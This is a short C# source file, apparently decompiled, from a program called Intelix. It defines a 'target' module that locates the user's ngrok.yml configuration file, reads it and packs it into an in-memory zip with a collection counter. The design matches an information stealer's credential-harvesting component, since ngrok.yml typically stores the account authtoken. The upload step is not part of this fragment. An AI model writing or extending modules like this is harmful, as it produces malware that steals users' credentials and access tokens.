using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Applications
{
	// Token: 0x0200004A RID: 74
	public class Ngrok : ITarget
	{
		// Token: 0x060000F2 RID: 242 RVA: 0x0000E328 File Offset: 0x0000C528
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ngrok", "ngrok.yml");
			bool flag = File.Exists(text);
			if (flag)
			{
				string text2 = "Ngrok\\ngrok.yml";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Ngrok";
				zip.AddFile(text2, File.ReadAllBytes(text));
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Applications.Add(counterApplications);
			}
		}
	}
}
